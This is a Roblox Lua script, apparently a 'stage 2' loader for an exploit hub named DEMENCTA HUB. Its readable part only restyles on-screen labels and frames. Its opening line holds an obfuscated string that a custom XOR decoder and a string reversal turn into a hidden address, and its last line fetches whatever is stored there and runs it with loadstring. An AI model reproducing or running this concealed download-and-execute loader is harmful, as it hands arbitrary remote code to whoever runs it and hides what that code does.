
--[[ STAGE 2: VISUAL CORE ]]
local eq3OHZoxoSIdSMSrVQ2lWU="\240\233\239\170\213\236\233\199\020\206\204\206\030\005\004\050\060\063\024\009\229\228\234\238\019\080\036\046\088\050\040\095\078\066\118\040\070\053\064\121\115\112\122\110\120\098\116\101\126\120\108\133\131\157\141\135\133\180\190\147\142\181\164\179\188\162\166\182\166\219\170\190\154\216\218\223\192\139\203\200\192\231\240\245\252\224\253\173\229\019\021\239\016\021\026\019\003\015\013\201\008\051\012\254\037\056\062\044\047\043\036\082\044\091\070\086\064\090\075\067\066\008\124\079\123\059\056\042\110\110\151\148\109"local TWb64Her9Ofnzs24XE_A=23 local Blt94g6Vt1lGVRZD=106 local hQSQI1IhVvbN2Z57y7x6=1 local C57c_r5F_0i0=3 local Kwye4Hz1hRr35rsn9=25 local SMgsdARJrUYPf7EBW=true local YnpvillUMSZqqM=bit32 and bit32.bxor if not YnpvillUMSZqqM then YnpvillUMSZqqM=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local PdqWSx2NwLNHREf6KIM={}for DxLx4oYiilcK9vbXI19=1,#eq3OHZoxoSIdSMSrVQ2lWU do local Kl7SNm4SllJj6Emt=string.byte(eq3OHZoxoSIdSMSrVQ2lWU,DxLx4oYiilcK9vbXI19)local d_aQ180lORWl=(Blt94g6Vt1lGVRZD+(DxLx4oYiilcK9vbXI19*C57c_r5F_0i0)+Kwye4Hz1hRr35rsn9)%256 if hQSQI1IhVvbN2Z57y7x6==0 then Kl7SNm4SllJj6Emt=(Kl7SNm4SllJj6Emt-d_aQ180lORWl)%256 PdqWSx2NwLNHREf6KIM[DxLx4oYiilcK9vbXI19]=string.char(YnpvillUMSZqqM(Kl7SNm4SllJj6Emt,TWb64Her9Ofnzs24XE_A))else Kl7SNm4SllJj6Emt=YnpvillUMSZqqM(Kl7SNm4SllJj6Emt,TWb64Her9Ofnzs24XE_A)PdqWSx2NwLNHREf6KIM[DxLx4oYiilcK9vbXI19]=string.char((Kl7SNm4SllJj6Emt-d_aQ180lORWl)%256)end end local uGwdVMv1oCJdv=table.concat(PdqWSx2NwLNHREf6KIM)if SMgsdARJrUYPf7EBW then uGwdVMv1oCJdv=string.reverse(uGwdVMv1oCJdv)end local YIJsM0AA7gLLyW=uGwdVMv1oCJdv
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(YIJsM0AA7gLLyW))()
